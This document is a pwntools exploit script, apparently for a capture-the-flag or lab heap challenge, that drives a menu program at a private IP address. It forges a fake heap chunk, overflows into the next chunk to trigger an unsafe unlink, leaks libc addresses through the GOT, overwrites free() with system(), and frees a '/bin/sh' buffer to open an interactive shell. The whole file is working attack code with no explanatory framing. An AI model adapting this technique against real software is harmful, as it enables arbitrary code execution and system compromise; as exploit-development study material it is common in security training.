#coding:utf-8

from pwn import *

p = remote("192.168.74.145", 1234)

context.log_level="debug"

def malc(content):
    p.recvuntil("What is you choose?\n")
    p.send("m\n")
    p.recvuntil("enter you code\n")
    p.sendline(content)

def fre(number):
    p.recvuntil("What is you choose?\n")
    p.send("f\n")
    p.recvline()
    p.sendline(number)

def edit(number, content):
    p.recvuntil("What is you choose?\n")
    p.send("e\n")
    p.recvuntil("which heap do you want to edit?\n")
    p.send(number)
    p.send("\n")
    p.sendline(content)

def prit(number):
    p.recvuntil("What is you choose?\n")
    p.send("p\n")
    p.recvline()
    p.sendline(number)

# raw_input("malloc first")
malc("a"*8)
# raw_input("malloc second")
malc("b"*16)
malc("/bin/sh")

payload = ""
# this is fake chunk inside first chunk
payload += p32(0)+p32(0x101)+p32(0x804bfa0-0xc)+p32(0x804bfa0-0x8)+'a'*(0x100-16) # 0x804bfa0 is the pointer of the first chunk' inside content
# modify seond chunk header
payload += p32(0x100)+p32(0x108)

raw_input("heap overflow...")
edit("0", payload)

raw_input("free second chunk(trigger unlink)")
fre("1")

raw_input("now leak free_GOT, and get the system address")
# edit("0", 'a'*12+p32(0x0804a014))
p.recvuntil("What is you choose?\n")
p.send("e\n")
p.recvuntil("which heap do you want to edit?\n")
p.send("0")
p.send("\n")
p.send('a'*12+p32(0x0804a014)) # because this , no use edit() directly
p.send("\n")

prit("0")


#leak了many个got表的地址，待会修改的时候再全部还原回去
#这样可以防止gets结尾加0x0破坏got表导致异常退出
free_addr = p.recv(4)
system_addr = u32(free_addr)-226288 # 226288 is the distance between free() and system() in my libc
scanf_addr = p.recv(4)
malloc_addr = p.recv(4)
puts_addr = p.recv(4)

raw_input("system")
p.recvuntil("What is you choose?\n")
p.send("e\n")
p.recvuntil("which heap do you want to edit?\n")
p.send("0")
p.send("\n")
p.send(p32(system_addr)+scanf_addr+malloc_addr+puts_addr)
p.send("\n")

fre('2')

p.interactive()